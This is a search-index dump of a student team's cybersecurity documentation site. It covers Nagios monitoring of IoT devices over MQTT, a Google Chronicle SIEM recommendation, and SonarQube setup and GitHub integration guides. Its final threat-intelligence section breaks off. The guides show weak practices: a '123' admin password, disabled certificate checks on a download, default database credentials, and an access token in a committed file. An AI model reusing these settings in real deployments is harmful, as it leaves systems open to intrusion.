suitable Linux distribution (e.g., Ubuntu or CentOS) for the Nagios server. Follow the installation guide to set up Nagios Core, ensuring all necessary dependencies are installed.  ","version":"Next","tagName":"h3"},{"title":"On Ubuntu​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#on-ubuntu","content":" sudo apt update sudo apt install nagios3 nagios-plugins nagios-nrpe-plugin On CentOS sudo yum install epel-release sudo yum install nagios nagios-plugins-all nagios-plugins-nrpe   Identify Necessary Plugins: Research and list Nagios plugins required for monitoring IoT devices and the MQTT server. Ensure the availability of plugins for REST API monitoring, MQTT health checks, and any specific IoT device metrics. Install plugins using package managers or manually from plugin repositories.  ","version":"Next","tagName":"h3"},{"title":"Configuration​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#configuration","content":" Define Host and Service Configurations: Hosts: Create configuration files for each IoT device and the MQTT broker, specifying IP addresses, hostnames, and relevant parameters.  define host { use linux-server host_name iot_device_1 alias IoT Device 1 address 192.168.1.100 max_check_attempts 5 check_period 24x7 notification_interval 30 notification_period 24x7 }   Services: Define service checks for each host, specifying the metrics to be monitored, check commands, and thresholds.  define service { use generic-service host_name iot_device_1 service_description CPU Load check_command check_snmp! -C public -o .1.3.6.1.4.1.2021.10.1.3.1 -w 4 -c 5 }   Set Up Monitoring Checks and Thresholds: IoT Device Metrics: Configure checks for temperature, humidity, device status, and other relevant metrics using appropriate plugins and commands. MQTT Server Metrics: Set up checks for MQTT broker uptime, active connections, message rates, and specific topic payloads.  define command { command_name check_mqtt command_line $USER1$/check_mqtt -H $HOSTADDRESS$ -p 1883 -t 'test/topic' -q 1 }   Configure Notification and Alerting Mechanisms: Email Alerts: Configure Nagios to send email alerts for critical events. Define contact groups and notification settings in the configuration files.  define contact { contact_name admin alias Nagios Admin email admin@example.com service_notification_period 24x7 host_notification_period 24x7 service_notification_options w,u,c,r host_notification_options d,u,r service_notification_commands notify-service-by-email host_notification_commands notify-host-by-email }   ","version":"Next","tagName":"h3"},{"title":"Testing​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#testing","content":" Validate Monitoring Checks: Ensure that all configured checks are working correctly by verifying data collection and monitoring metrics.Use the Nagios web interface to check the status of hosts and services, ensuring accurate and timely updates. Simulate Network Issues: Introduce simulated network issues (e.g., disconnecting a device, overloading the MQTT broker) to verify that Nagios detects and alerts these issues correctly.Check that alerts are sent out as configured and that the notifications contain accurate information. Adjust Configurations: Based on testing results, fine-tune monitoring thresholds, check intervals, and notification settings to ensure optimal performance and reliability.Update configurations as needed to address any identified gaps or issues.  ","version":"Next","tagName":"h3"},{"title":"Deployment​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#deployment","content":" Migrate Configurations to Production: Transfer validated configurations from the test environment to the production Nagios server.Ensure that all dependencies and plugins are installed and configured correctly on the production server. Ensure Minimal Disruption: Plan the transition to minimize impact on network operations, possibly by performing the deployment during off-peak hours.Use phased deployment if necessary, gradually bringing Nagios monitoring online to ensure stability. Monitor Performance and Adjust: Continuously monitor the performance of Nagios in the production environment, ensuring that all metrics are collected and alerts are generated as expected.Make any necessary adjustments based on real-world performance, fine-tuning configurations to achieve the desired monitoring outcomes.  ","version":"Next","tagName":"h3"},{"title":"5. Potential Gaps and Challenges​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#5-potential-gaps-and-challenges","content":" ","version":"Next","tagName":"h2"},{"title":"Scalability​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#scalability","content":" Handling a Large Number of IoT Devices: Ensuring Nagios can efficiently monitor a vast number of IoT devices without performance degradation. Nagios Performance Under Heavy Load: Monitoring the impact on server resources and ensuring Nagios remains responsive under high data throughput.  ","version":"Next","tagName":"h3"},{"title":"Compatibility​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#compatibility","content":" IoT Device Monitoring: Verifying that all IoT devices can be integrated and monitored by Nagios, requiring custom plugins or scripts. MQTT Protocols and Data Formats: Ensuring compatibility with MQTT protocols and handling various data formats transmitted by IoT devices.  ","version":"Next","tagName":"h3"},{"title":"Resource Constraints​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#resource-constraints","content":" Server Resources: Ensuring the server has sufficient CPU, memory, and storage to run Nagios and manage the monitoring load. Network Bandwidth: Assessing the network bandwidth to handle the increased traffic from constant monitoring and data transmission.  ","version":"Next","tagName":"h3"},{"title":"Skill Gaps​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#skill-gaps","content":" Technical Expertise: Developing proficiency in configuring Nagios, creating custom plugins, and integrating with IoT and MQTT protocols. Knowledge of MQTT and IoT Communication: Understanding MQTT protocols and IoT device communication for effective monitoring and troubleshooting.  ","version":"Next","tagName":"h3"},{"title":"6. Recommendations​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#6-recommendations","content":" ","version":"Next","tagName":"h2"},{"title":"Consultation​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#consultation","content":" Stakeholder Insights: Discuss with stakeholders, including Ben, to gather insights and address potential challenges early on. Community Engagement: Engage with Nagios and MQTT communities to learn best practices and gain support.  ","version":"Next","tagName":"h3"},{"title":"Training​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#training","content":" Team Training: Provide training sessions for the team on Nagios setup, configuration, and integration with MQTT and IoT devices. Documentation and Guidelines: Develop comprehensive documentation and guidelines for ongoing monitoring and maintenance.  ","version":"Next","tagName":"h3"},{"title":"Pilot Implementation​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#pilot-implementation","content":" Small-Scale Pilot: Start with a small-scale pilot implementation to validate the feasibility and identify any unforeseen issues. Gradual Scaling: Gradually scale up based on the pilot results and feedback, ensuring smooth and efficient expansion.  ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"Feasibility/Gap Analysis for Implementing Nagios on a Linux Server with IoT Devices Connected via MQTT","url":"/redback-documentation/docs/cybersecurity/research/nagios/Nagios-Report#conclusion","content":" Implementing Nagios for monitoring a network with IoT devices connected via an MQTT server is feasible, provided careful planning, configuration, and testing are carried out. Addressing potential gaps and challenges through stakeholder engagement and training will ensure a smooth implementation and effective network monitoring.  By thoroughly preparing the environment, configuring Nagios to suit specific network needs, and rigorously testing the setup, the deployment can be successfully transitioned to production. With proper consultation, skill development, and a phased approach, Nagios can significantly enhance the monitoring capabilities of the network, ensuring reliable performance and prompt alerting for potential issues. ","version":"Next","tagName":"h2"},{"title":"SIEMs and Google Chronicle","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/siems-google-chronical","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"SIEMs and Google Chronicle","url":"/redback-documentation/docs/cybersecurity/research/siems-google-chronical#introduction","content":" International Business Machines Corporation (IBM) [1] states that Security information and event management (SIEM) is a security solution that enables companies like Redback operations to identify cyber security threats and vulnerabilities before they negatively impact business operations. There are multiple SIEM solutions currently used throughout the Cyber security industry which include Splunk, LogRhythm, IBM QRadar, and Microsoft Azure Sentinel. Because the Redbacks DevOps team has indicated they will be using google cloud It is recommended that the DevOps team implements the Google Chronicle SIEM in their cloud environment because of the ease of integration and included cost within google cloud.  ","version":"Next","tagName":"h2"},{"title":"How does a SIEM work?​","type":1,"pageTitle":"SIEMs and Google Chronicle","url":"/redback-documentation/docs/cybersecurity/research/siems-google-chronical#how-does-a-siem-work","content":" SIEMs combine several sources of security alerts, log data, and events into one easily accessible platform, enabling cybersecurity analysts to conduct real-time security monitoring [4]. The SIEM software works by collecting and storing ‘…log and event data produced from applications, devices, networks, infrastructure, and systems’ [4]. This can either take the form of an on-premises or Cloud SIEM solution. Implementing an on-premises or cloud SIEM enables the cybersecurity team to conduct analysis on daily operations and provides a single platform to view the entire organization’s information technology infrastructure activity. A high-level operation of the LOGPOINT SIEM can be seen in figure 1 below.    [7] From “What is SIEM? A complete guide to Security Information and Event Management” by LOGPOINT, N/A, https://www.logpoint.com/en/understand/what-is-siem/. Figure 1 How the LOGPOINT SIEM works    ","version":"Next","tagName":"h2"},{"title":"Benefits and Disadvantages of a SIEM​","type":1,"pageTitle":"SIEMs and Google Chronicle","url":"/redback-documentation/docs/cybersecurity/research/siems-google-chronical#benefits-and-disadvantages-of-a-siem","content":" No matter how big or small the organization’s IT infrastructure might be SIEM can provide benefits from data compliance to stop cyber-attacks. PeerSpot [2] states that the following list is the top five benefits of having a SIEM:  • Improved efficiency and speed of security Operations • Increased accuracy of security alerts and threat detection • Higher level security of data • Improved network visibility • Compliance is increased  These befits don’t come without disadvantages. PeerSpot [2] argues that the main disadvantage is the cost of implementing a SIEM system. This cost can be up to thousands or tens of thousands of dollars, depending on the organization’s size. Another disadvantage can be the effort to configure a system. However, regarding Redback’s situation, google chronicle is a native google cloud SIEM platform which should keep costs low and make integration straightforward [3]. Therefore, it is recommended that Redback operations implement Google Chronicle SIEM within their own google cloud environment to enable the organization to investigate and respond to any cyber-attack or data breaches that may occur.  ","version":"Next","tagName":"h2"},{"title":"Google Chronicle​","type":1,"pageTitle":"SIEMs and Google Chronicle","url":"/redback-documentation/docs/cybersecurity/research/siems-google-chronical#google-chronicle","content":" Google Cloud [5] states that its chronicle platform is “a cloud service, built as a specialized layer on top of core Google infrastructure, designed for enterprises to privately retain, analyse, and search the massive amounts of security and network telemetry they generate.” Google chronicle will also normalize and correlates this collected data on its own to provide real-time analysis of any suspicious activity occurring in the cloud environment [5]. Figure 2 below provides an overview of the google chronicle service.    From “Chronicle overview” by Google Cloud, N/A, https://cloud.google.com/chronicle/docs/overview. [5] Figure 2 Overview of how Google Chronicle functions    Google [5] states that the security and network data can be collected in three ways:  • Forwarder – a small software component installed onto the Redbacks network that collects system logs, packet capture, and SIEM data repositories. • Ingestion APIs: APIs allow the logs to be sent straight to the Chronicle platform, therefore additional hardware or software components like forwarders are not needed. • Third-party integrations: Third-party APIs to allow the importation of security logs, e.g., Office 365 and Azure AD.  This security and network data can then be analysed through Google chronicle’s simple browser-based application. Enabling analysts to easily monitor the security of the cloud environment. This can be seen in figure 3 below.    From “Log in to Chronicle” by Google Cloud, n.d., https://cloud.google.com/chronicle/docs/log-in-to-ui. [6] Figure 3 Log into Google Chronicle web browser landing page    Google [5] suggests that these analysts can use Chronicle features such as: • Search – Google Chronicle has a Raw log scan function with can be used with regular expressions to find specific logs [5]. • Investigative Views – Can include enterprise insights to display domains and assets that require investigation [5]. Asset view can be used to identify if any piece of IT infrastructure has interacted with out-of-the-ordinary domains [5]. • Curated Information – Asset insight blocks can pinpoint the domains and alerts that security analysts should investigate in more detail [5]. • Detection Engine – Enables the automation of the search process to look through and discover security issues [5]. Specific rules can be created to search every piece of incoming data and alerts can be set up [5]. • Integration and tools - Malware identification sites like Virus Total can be integrated for easy access, and Chronicle has a chrome extension that enables the web application to be launched anywhere in the google chrome browser [5].  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"SIEMs and Google Chronicle","url":"/redback-documentation/docs/cybersecurity/research/siems-google-chronical#conclusion","content":" In conclusion, SIEMs can be extremely beneficial to safeguard and monitor the security of Redback’s IT infrastructure. A SIEM will provide Redback with the tools to combine several sources of security data into a centralized place for analysis. The main benefits of doing this are the improvement of security operations efficiency and increased accuracy of security alerts; With the main disadvantage being implementation cost. However, Google Chronicle mitigates these costs for Redback, as the DevOps team will be hosting their infrastructure on Google Cloud. Because of this, it is recommended that Google chronicle be implemented as Redback’s SIEM platform.  ","version":"Next","tagName":"h2"},{"title":"Reference list​","type":1,"pageTitle":"SIEMs and Google Chronicle","url":"/redback-documentation/docs/cybersecurity/research/siems-google-chronical#reference-list","content":" [1] International Business Machines Corporation. (n.d.). What is SIEM? Security Information and Event Management Explained [Website]. Available: URL https://www.ibm.com/au-en/topics/siem  [2] PeerSpot. (n.d.). Best Security Information and Event Management (SIEM) Tools [Website]. Available: URL https://www.peerspot.com/categories/security-information-and-event-management-siem  [3] Google Cloud. (n.d.). Chronicle Security [Website]. Available: URL https://chronicle.security/  [4] K. Gast (2021, March). What is SIEM? And How Does It Work? [Website]. Available: URL https://logrhythm.com/blog/what-is-siem  [5] Google Cloud (n.d.). Chronicle overview [Website]. Available: URL https://cloud.google.com/chronicle/docs/overview  [6] Google Cloud (n.d.). Log in to Chronicle [Website]. Available: URL https://cloud.google.com/chronicle/docs/log-in-to-ui  [7] LOGPOINT (n.d.). What is SIEM? A complete guide to Security Information and Event Management [Website]. Available: URL https://www.logpoint.com/en/understand/what-is-siem/ ","version":"Next","tagName":"h2"},{"title":"Redback Nagios Setup Guide","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide","content":"","keywords":"","version":"Next"},{"title":"Running as Root​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#running-as-root","content":" All steps require running as root. To become root, simply run:  ","version":"Next","tagName":"h2"},{"title":"Ubuntu:​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#ubuntu","content":" sudo -i   All commands from this point onwards will be as root.  ","version":"Next","tagName":"h3"},{"title":"Prerequisites​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#prerequisites","content":" ","version":"Next","tagName":"h2"},{"title":"Ubuntu 20.04:​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#ubuntu-2004","content":" apt-get update apt-get install -y autoconf gcc libc6 make wget unzip apache2 apache2-utils php libgd-dev apt-get install openssl libssl-dev     ","version":"Next","tagName":"h3"},{"title":"Downloading the Source​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#downloading-the-source","content":" cd /tmp wget -O nagioscore.tar.gz https://github.com/NagiosEnterprises/nagioscore/archive/nagios-4.4.14.tar.gz tar xzf nagioscore.tar.gz     ","version":"Next","tagName":"h2"},{"title":"Compile​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#compile","content":" cd /tmp/nagioscore-nagios-4.4.14/ ./configure --with-httpd-conf=/etc/apache2/sites-enabled make all     ","version":"Next","tagName":"h2"},{"title":"Create User and Group​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#create-user-and-group","content":" This creates the nagios user and group. The www-data user is also added to the nagios group.  make install-groups-users usermod -a -G nagios www-data     ","version":"Next","tagName":"h2"},{"title":"Install Binaries​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#install-binaries","content":" This step installs the binary files, CGIs, and HTML files.  make install     ","version":"Next","tagName":"h2"},{"title":"Install Service/Daemon​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#install-servicedaemon","content":" This installs the service/daemon files and configures them to start on boot.  make install-daemoninit     ","version":"Next","tagName":"h2"},{"title":"Install Command Mode​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#install-command-mode","content":" This installs and configures the external command file.  make install-commandmode     ","version":"Next","tagName":"h2"},{"title":"Install Configuration Files​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#install-configuration-files","content":" This installs the SAMPLE configuration files, required to start Nagios.  make install-config     ","version":"Next","tagName":"h2"},{"title":"Install Apache Config Files​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#install-apache-config-files","content":" This installs the Apache web server configuration files and configures the Apache settings.  make install-webconf a2enmod rewrite a2enmod cgi     ","version":"Next","tagName":"h2"},{"title":"Configure Firewall​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#configure-firewall","content":" Allow port 80 inbound traffic on the local firewall for Nagios Core web interface access.  iptables -I INPUT -p tcp --destination-port 80 -j ACCEPT apt-get install -y iptables-persistent   Answer yes to saving existing rules.    ","version":"Next","tagName":"h2"},{"title":"Create nagiosadmin User Account​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#create-nagiosadmin-user-account","content":" You'll need to create an Apache user account to log into Nagios. The following command will create a user account called nagiosadmin:  htpasswd -c /usr/local/nagios/etc/htpasswd.users nagiosadmin   When adding additional users, remove -c from the command to avoid replacing the existing nagiosadmin user.    ","version":"Next","tagName":"h2"},{"title":"Start Apache Web Server​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#start-apache-web-server","content":" Restart the Apache server after making the changes.  systemctl restart apache2.service     ","version":"Next","tagName":"h2"},{"title":"Start Nagios Service/Daemon​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#start-nagios-servicedaemon","content":" Start the Nagios service.  systemctl start nagios.service     ","version":"Next","tagName":"h2"},{"title":"Test Nagios​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#test-nagios","content":" Nagios is now running. To confirm, log into the Nagios Web Interface by pointing your browser to the IP address or FQDN of your Nagios Core server:  http://10.25.5.143/nagios http://core-013.domain.local/nagios   Use nagiosadmin as the username and the password (password = 123) you provided earlier.    ","version":"Next","tagName":"h2"},{"title":"Installing Nagios Plugins​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#installing-nagios-plugins","content":" Nagios Core needs plugins to operate properly. Follow these steps to install Nagios Plugins.  ","version":"Next","tagName":"h2"},{"title":"Prerequisites​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#prerequisites-1","content":" Install the required packages:  apt-get install -y autoconf gcc libc6 libmcrypt-dev make libssl-dev wget bc gawk dc build-essential snmp libnet-snmp-perl gettext     ","version":"Next","tagName":"h3"},{"title":"Downloading the Source​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#downloading-the-source-1","content":" cd /tmp wget --no-check-certificate -O nagios-plugins.tar.gz https://github.com/nagios-plugins/nagios-plugins/archive/release-2.4.6.tar.gz tar zxf nagios-plugins.tar.gz     ","version":"Next","tagName":"h3"},{"title":"Compile and Install​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#compile-and-install","content":" cd /tmp/nagios-plugins-release-2.4.6/ ./tools/setup ./configure make make install     ","version":"Next","tagName":"h3"},{"title":"Test Plugins​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#test-plugins","content":" Point your browser to the Nagios Core server:  http://10.25.5.143/nagios http://core-013.domain.local/nagios   Go to a host or service object and &quot;Re-schedule the next check&quot; under the Commands menu. The previous error should now disappear and the correct output will appear.    ","version":"Next","tagName":"h2"},{"title":"Service/Daemon Commands​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#servicedaemon-commands","content":" ","version":"Next","tagName":"h2"},{"title":"Ubuntu:​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#ubuntu-1","content":" systemctl start nagios.service systemctl stop nagios.service systemctl restart nagios.service systemctl status nagios.service     ","version":"Next","tagName":"h3"},{"title":"Network Configuration for Nagios and IoT Devices​","type":1,"pageTitle":"Redback Nagios Setup Guide","url":"/redback-documentation/docs/cybersecurity/research/nagios/Redback_nagios_setup_guide#network-configuration-for-nagios-and-iot-devices","content":" Place the Nagios server and IoT devices on the same network to enable seamless communication. Ensure that the network supports the MQTT protocol for data exchange between the IoT devices and Nagios.    Figure 1: Port configuration for Nagios  Since there is another service running on port 80, change that to port 443 in order to run Nagios and create another Apache instance to access Nagios.    Figure 2: Apache 2 setup ","version":"Next","tagName":"h2"},{"title":"SonarQube Cloud Installation Guide using Azure Ubuntu Virtual Machine","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/sonarqube/sonarqube-azure-cloud-host","content":"","keywords":"","version":"Next"},{"title":"Prerequisites​","type":1,"pageTitle":"SonarQube Cloud Installation Guide using Azure Ubuntu Virtual Machine","url":"/redback-documentation/docs/cybersecurity/research/sonarqube/sonarqube-azure-cloud-host#prerequisites","content":" New Ubuntu 22.0.4 Virtual Machine instance with at least medium performance (4 GB RAM) Docker Docker-compose    ","version":"Next","tagName":"h2"},{"title":"Step 1: System Configuration​","type":1,"pageTitle":"SonarQube Cloud Installation Guide using Azure Ubuntu Virtual Machine","url":"/redback-documentation/docs/cybersecurity/research/sonarqube/sonarqube-azure-cloud-host#step-1-system-configuration","content":" Login to SonarQube instance using git bash or azure cli and perform below command to configure virtual memory permanently for SonarQube to function:  sudo nano /etc/sysctl.conf   Add the following lines to the bottom of that file by scrolling all the way down:  vm.max_map_count=262144 fs.file-max=65536   Press Ctrl + O and Enter for saving the file. Press Ctrl + X for exiting the file after saving.  To make sure changes are getting into effect:  sudo sysctl -p   Perform System update  sudo apt update     ","version":"Next","tagName":"h2"},{"title":"Step 2: Create docker-compose.yml​","type":1,"pageTitle":"SonarQube Cloud Installation Guide using Azure Ubuntu Virtual Machine","url":"/redback-documentation/docs/cybersecurity/research/sonarqube/sonarqube-azure-cloud-host#step-2-create-docker-composeyml","content":" Create yaml file   sudo vi docker-compose.yml   copy and paste below script   version: &quot;3&quot; services: sonarqube: image: sonarqube:community restart: unless-stopped depends_on: - db environment: SONAR_JDBC_URL: jdbc:postgresql://db:5432/sonar SONAR_JDBC_USERNAME: sonar SONAR_JDBC_PASSWORD: sonar volumes: - sonarqube_data:/opt/sonarqube/data - sonarqube_extensions:/opt/sonarqube/extensions - sonarqube_logs:/opt/sonarqube/logs ports: - &quot;9000:9000&quot; db: image: postgres:12 restart: unless-stopped environment: POSTGRES_USER: sonar POSTGRES_PASSWORD: sonar volumes: - postgresql:/var/lib/postgresql - postgresql_data:/var/lib/postgresql/data volumes: sonarqube_data: sonarqube_extensions: sonarqube_logs: postgresql: postgresql_data:     ","version":"Next","tagName":"h2"},{"title":"Step 3: Execute the compose file using Docker compose command​","type":1,"pageTitle":"SonarQube Cloud Installation Guide using Azure Ubuntu Virtual Machine","url":"/redback-documentation/docs/cybersecurity/research/sonarqube/sonarqube-azure-cloud-host#step-3-execute-the-compose-file-using-docker-compose-command","content":" Open the bash shell and execute the below code   sudo docker-compose up -d   Make sure SonarQube is up and running by checking the logs   sudo docker-compose logs   Now access sonarQube Dashboard by going to browser and enter public dns name OR public IP address with port 9000  Now to go to browser --&gt; http://SonarQube_public_dns_name:9000/ --&gt; http://your_SonarQube_public_IP_address:9000/    By following these steps, you can successfully integrate SonarQube with GitHub to enhance your code quality and maintainability practices. ","version":"Next","tagName":"h2"},{"title":"SonarQube Local Integration Bible","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/sonarqube/SonarQube-local-setup","content":"SonarQube Local Integration Bible info Author : Ashan Ruwanpathiranage","keywords":"","version":"Next"},{"title":"SonarQube Integration with GitHub","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/sonarqube/sonarqube-github-intergration","content":"","keywords":"","version":"Next"},{"title":"Prerequisites​","type":1,"pageTitle":"SonarQube Integration with GitHub","url":"/redback-documentation/docs/cybersecurity/research/sonarqube/sonarqube-github-intergration#prerequisites","content":" SonarQube Setup: A running instance of SonarQube on an Azure Virtual Machine.Access to the SonarQube dashboard.Admin permissions on SonarQube. GitHub Setup: A GitHub repository to integrate.Admin access to the repository.A GitHub App created with necessary permissions.    ","version":"Next","tagName":"h2"},{"title":"Step 1: Configure GitHub App​","type":1,"pageTitle":"SonarQube Integration with GitHub","url":"/redback-documentation/docs/cybersecurity/research/sonarqube/sonarqube-github-intergration#step-1-configure-github-app","content":" Modify App Permissions: Go to the GitHub App settings.Under Permissions, set the following: Repository Permissions: Metadata: Read-onlyChecks: Read &amp; writeCommit statuses: Read &amp; writePull requests: Read &amp; write Organization Permissions (if applicable): Administration: Read-only Save changes. Add Webhook: In the GitHub App settings, add a new webhook.Use the following details: Payload URL: http://&lt;your-azure-vm-ip&gt;:9000/webhook.Content type: application/json.Secret: The webhook secret generated in SonarQube. Save the webhook. Install the App: Install the GitHub App on the repository you wish to integrate.    ","version":"Next","tagName":"h2"},{"title":"Step 2: Set Up the SonarQube Project​","type":1,"pageTitle":"SonarQube Integration with GitHub","url":"/redback-documentation/docs/cybersecurity/research/sonarqube/sonarqube-github-intergration#step-2-set-up-the-sonarqube-project","content":" Create a Project in SonarQube: Navigate to Projects &gt; Create Project.Provide a project key and display name. Generate a Token: Navigate to your user profile in SonarQube.Go to My Account &gt; Security &gt; Tokens.Generate a new token and save it securely. Set Up the sonar-project.properties File: In your GitHub repository, create a sonar-project.properties file with the following content: sonar.projectKey=&lt;your-project-key&gt; sonar.organization=&lt;your-organization&gt; sonar.host.url=http://&lt;your-azure-vm-ip&gt;:9000 sonar.login=&lt;your-generated-token&gt;     ","version":"Next","tagName":"h2"},{"title":"Step 3: Configure CI/CD Pipeline​","type":1,"pageTitle":"SonarQube Integration with GitHub","url":"/redback-documentation/docs/cybersecurity/research/sonarqube/sonarqube-github-intergration#step-3-configure-cicd-pipeline","content":" Add SonarScanner to Your CI/CD Pipeline: Update your CI/CD configuration file (e.g., GitHub Actions, Jenkins, etc.) to include SonarScanner.Example GitHub Actions Workflow: name: SonarQube Scan on: pull_request: push: branches: - main jobs: sonarQube: runs-on: ubuntu-latest steps: - name: Checkout code uses: actions/checkout@v3 - name: Run SonarQube Scan run: | sonar-scanner \\ -Dsonar.projectKey=&lt;your-project-key&gt; \\ -Dsonar.host.url=http://&lt;your-azure-vm-ip&gt;:9000 \\ -Dsonar.login=&lt;your-generated-token&gt; Commit and Push: Commit the pipeline configuration to your repository and push it.    ","version":"Next","tagName":"h2"},{"title":"Step 5: Verify Integration​","type":1,"pageTitle":"SonarQube Integration with GitHub","url":"/redback-documentation/docs/cybersecurity/research/sonarqube/sonarqube-github-intergration#step-5-verify-integration","content":" Trigger a Build: Open a pull request or push a commit to the repository. Check SonarQube: Go to your project in SonarQube.Verify that the analysis results are displayed. Check GitHub: Open the pull request in GitHub.Verify that the SonarQube checks (e.g., code quality, security analysis) are displayed.    ","version":"Next","tagName":"h2"},{"title":"Troubleshooting​","type":1,"pageTitle":"SonarQube Integration with GitHub","url":"/redback-documentation/docs/cybersecurity/research/sonarqube/sonarqube-github-intergration#troubleshooting","content":" Connection Issues: Ensure the Azure VM’s firewall allows traffic to and from GitHub.Verify that the webhook URL is correct. Permissions Issues: Double-check the GitHub App permissions and installation. Pipeline Failures: Check the CI/CD logs for errors in the SonarScanner configuration.    By following these steps, you can successfully integrate SonarQube with GitHub to enhance your code quality and maintainability practices. ","version":"Next","tagName":"h2"},{"title":"Threat Intelligence","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/Threat Intelligence","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Threat Intelligence","url":"/redback-documentation/docs/cybersecurity/research/Threat Intelligence#1-introduction","content":" Threat intelligence, often referred to as cyber threat intelligence (CTI), is the process of collecting, analyzing, and utilizing information about potential or existing threats to an organization's digital infrastructure. It is an essential component of a 